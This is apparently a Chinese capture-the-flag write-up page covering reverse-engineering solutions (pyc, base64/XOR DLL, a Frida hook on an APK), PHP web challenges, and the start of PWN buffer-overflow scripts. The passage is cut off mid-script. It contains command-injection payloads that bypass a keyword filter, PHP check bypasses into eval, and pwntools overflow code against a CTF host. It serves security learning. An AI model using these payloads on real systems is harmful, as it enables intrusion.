flag!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Sorry,Your input is Wrong&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling .\pyre.pyc</span></span><br></pre></td></tr></table></figure><p>分析代码，可以发现我们的输入只是进行了经过table表的下标混淆，直接经过table表还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">17</span>]</span><br><span class="line">flag = <span class="string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(flag[table.index(i)], end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>flag{PYRE_1S_S0_FUN!!!}</p><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>该程序从enc.dll中加载encode函数，我们的明文str经过encode加密而后与final进行比较。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> <span class="keyword">final</span>[<span class="number">100</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">100</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+100h] [rbp+80h] BYREF</span></span><br><span class="line">  Lpfunc encode; <span class="comment">// [rsp+170h] [rbp+F0h]</span></span><br><span class="line">  HMODULE handle; <span class="comment">// [rsp+178h] [rbp+F8h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in">sizeof</span>(str));</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="built_in">sizeof</span>(input));</span><br><span class="line">  <span class="built_in">memset</span>(<span class="keyword">final</span>, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="keyword">final</span>));</span><br><span class="line">  <span class="built_in">memset</span>(<span class="keyword">final</span>, <span class="number">8</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">3</span>] = <span class="number">13</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">4</span>] = <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">5</span>] = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">6</span>] = <span class="number">17</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">7</span>] = <span class="number">17</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">8</span>] = <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">9</span>] = <span class="number">46</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">10</span>] = <span class="number">43</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">11</span>] = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">12</span>] = <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">13</span>] = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">15</span>] = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">16</span>] = <span class="number">59</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">17</span>] = <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">18</span>] = <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">19</span>] = <span class="number">21</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">20</span>] = <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">21</span>] = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">22</span>] = <span class="number">80</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">23</span>] = <span class="number">70</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">24</span>] = <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">25</span>] = <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">26</span>] = <span class="number">57</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">27</span>] = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">28</span>] = <span class="number">49</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">29</span>] = <span class="number">86</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">30</span>] = <span class="number">36</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">31</span>] = <span class="number">28</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(&amp;<span class="keyword">final</span>[<span class="number">32</span>], <span class="string">&quot;?$P&lt;,%#K&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  handle = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;enc.dll&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !handle )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Dll Loading Failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  encode = <span class="number">0</span>i64;</span><br><span class="line">  encode = (Lpfunc)<span class="built_in">GetProcAddress</span>(handle, <span class="string">&quot;encode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !encode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Function Failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="built_in">encode</span>(input, str);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(str, <span class="keyword">final</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your input is right:)&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The flag is Wrong:(&quot;</span>);</span><br><span class="line">  <span class="built_in">FreeLibrary</span>(handle);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将该enc.dll拉进IDA分析encode函数，Ctrl + F 在函数框中 搜索函数。（为什么出现两个encode，这其实是C++逆向的特性，具体原因以后会慢慢明白）</p><p><img src="https://s2.loli.net/2023/08/04/4C9HMcpd2jtsVbx.png" alt="image-20221011154914716.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">encode_0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;unk_180021001);</span><br><span class="line">  v3 = <span class="built_in">j_strlen</span>(a1);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v5) = aAbcdefghijklmn[a1[v4] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    *(_BYTE *)(a2 + v5 + <span class="number">1</span>) = aAbcdefghijklmn[((a1[v4 + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (a1[v4] &amp; <span class="number">3</span>))];</span><br><span class="line">    *(_BYTE *)(a2 + v5 + <span class="number">2</span>) = aAbcdefghijklmn[((a1[v4 + <span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (a1[v4 + <span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">    *(_BYTE *)(a2 + v5 + <span class="number">3</span>) = aAbcdefghijklmn[a1[v4 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v4 += <span class="number">3</span>;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v5 - <span class="number">1</span>) = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v5 - <span class="number">2</span>) = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v5 - <span class="number">1</span>) = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_18001132A</span>(a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入aAbcdefghijklmn发现一串字符串，很明显的base64加密。</p><p><img src="https://s2.loli.net/2023/08/04/vG4bfctpj1XoUxQ.png" alt="image-20221011155015174.png"></p><p>随后return进入sub_18001132A函数，发现你逻辑是与一个字符串’Reverse’进行异或。</p><p><img src="https://s2.loli.net/2023/08/04/ATv4j1NVJktHwSG.png" alt="image-20221011155750852.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_180011660</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;unk_180021001);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">j_strlen</span>(output); ++i )</span><br><span class="line">    output[i] ^= Str[i % <span class="built_in">j_strlen</span>(Str)];</span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么逆向的过程就是将密文异或字符串，再Base64解密即可。</p><p><img src="https://s2.loli.net/2023/08/04/YnFUQd2Hvcy7Xlg.png" alt="image-20221011161751552.png"></p><p>动调拿到数据。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pybase64</span><br><span class="line"><span class="built_in">str</span>=[<span class="number">8</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">40</span>, <span class="number">64</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">60</span>, <span class="number">46</span>, <span class="number">43</span>, <span class="number">30</span>, <span class="number">61</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">5</span>, <span class="number">80</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">42</span>, <span class="number">57</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">86</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">63</span>, <span class="number">36</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">37</span>, <span class="number">35</span>, <span class="number">75</span>]</span><br><span class="line">key=<span class="string">&#x27;Reverse&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">str</span>[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line">flag=pybase64.b64decode(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{Base64_1s_1nterestr1ng!!}</p><h2 id="艾克体悟题"><a href="#艾克体悟题" class="headerlink" title="艾克体悟题"></a>艾克体悟题</h2><p>apk逆向，jeb反汇编java。</p><p><img src="https://s2.loli.net/2023/08/04/giQBphajKW8fk4N.png" alt="image-20221011165109988.png"></p><p>在FlagActivity类里发现代码逻辑是当cnt大于10000就能得到flag。</p><p>这里有两种方法可以get flag</p><p><del>那么一个思路就是点一万下</del></p><p>另一个思路就是hook access$000 函数让该函数直接返回10000，判断就成立了，我们就GetFlag了</p><p>所以此时就可以用 Frida 了，就是在程序运行的时候 hook 返回值变为1000即可</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./data/local/tmp/frida-server # 进入shell Frida启动！</span><br></pre></td></tr></table></figure><p>再进入一个shell 启动指定控件</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivity</span><br></pre></td></tr></table></figure><p>查看我们启动控件的PID</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hungs&gt;frida-ps -aU</span><br><span class="line">  PID  Name             Identifier</span><br><span class="line">-----  ---------------  ---------------------------------------</span><br><span class="line">10738  Activity_Travel  com.droidlearn.activity_travel</span><br><span class="line"> 9870  Android Auto     com.google.android.projection.gearhead</span><br><span class="line">23407  Google           com.google.android.googlequicksearchbox</span><br><span class="line"> 9063  Google Play 商店   com.android.vending</span><br><span class="line"> 9022  Google Play 电影   com.google.android.videos</span><br><span class="line">11206  Magisk           com.topjohnwu.magisk</span><br></pre></td></tr></table></figure><p>接着我们就是 attach 上了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">10738</span>)</span><br></pre></td></tr></table></figure><p>接着可以编写我们的 js 脚本用来重写要hook的类方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="comment">//定位类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">    <span class="comment">//在这里更改类的方法的实现（implementation）</span></span><br><span class="line">    my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="comment">//打印替换前的参数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>接着让我们的 js 脚本加载到该目标进程上即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接安卓机上的frida-servr</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">10738</span>)</span><br><span class="line"><span class="comment"># 加载hooook.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hooook.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"><span class="comment"># 脚本会持续运行等待输入</span></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>运行脚本，再点击 CLICK ME 即可！</p><p>GetFlag!</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>前4题和最后一题不说，不难。</p><h2 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php代码审计。</p><ul><li><p>第一层要求将参数data所带的字符串为Welcome to CTF。</p><p>用data://伪协议传入数据流绕过。</p></li><li><p>第二层要求<code>md5($_GET[&#39;key1&#39;]) === md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;]</code></p><p>MD5强比较，那么用数组绕过，md5()函数无法处理数组，如果传入的为数组，会返回NULL。== 弱比较可用科学计数法绕过。参考文章：<a href="https://mochu.blog.csdn.net/article/details/114494427">(65条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初mochu7的博客-CSDN博客</a></p></li><li><p>第三层<code>!is_numeric($_POST[&#39;num&#39;]) &amp;&amp; intval($_POST[&#39;num&#39;]) == 2077</code></p><p>is_numeric()判断是不是数字或数字字符串，intval() 函数用于获取变量的整数值，可以使用2077a，2077%00，2077%0a绕过</p></li><li><p>第四层<code>eval(&quot;#&quot;.$_GET[&#39;cmd&#39;]);</code></p><p>.拼接字符串，#后的被注释了，可以用%0a换行绕过，或者?&gt;闭合。</p></li></ul><p>即可得到flag。</p><h2 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单写个脚本，可以看到这些字符没被过滤。<br><img src="https://s2.loli.net/2023/08/04/sbVnF3KArw1dCTJ.png" alt="image-20221026100324165.png"><br>利用<code>cd</code>切换目录，<code>&amp;&amp;</code>执行多条，<code>$@</code>绕过关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">cd</span>%09..%26%26cd%09..%26%26cd%09..%26%26ls</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/d9S8tumhjGvMnEw.png" alt="image-20221026101033075.png"><br>playload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">cd</span>%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca<span class="variable">$@t</span>%09ffff<span class="variable">$@llllaaaaggggg</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/NmjUk8GKHOI7Zf4.png" alt="image-20221026101433108.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29527</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x08</span>) + p64(<span class="number">0x400708</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span 